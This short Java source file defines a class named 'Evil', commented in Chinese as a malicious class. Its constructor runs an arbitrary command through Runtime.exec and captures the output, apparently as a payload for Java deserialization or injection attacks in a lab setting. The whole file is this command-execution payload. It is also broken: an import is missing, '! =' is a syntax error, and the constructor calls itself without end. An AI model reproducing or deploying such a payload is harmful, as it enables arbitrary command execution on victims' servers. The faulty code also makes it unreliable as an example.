import java.io.BufferedReader;
import java.io.InputStream;

// 恶意类
public class Evil{
	String res;
	public Evil(String cmd) throws Exception{
		StringBuilder sb = new StringBuilder();
		BufferedReader reader = new BufferedReader(
		new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())
		);
		String line;
		while((line = reader.readLine())! = null){
		sb.append(line).append("\n");
		}
		this.res = sb.toString();
		
		// 调用恶意类
		System.out.println(new Evil(cmd));
	}
	
	public String toString(){
		return res;
	}
}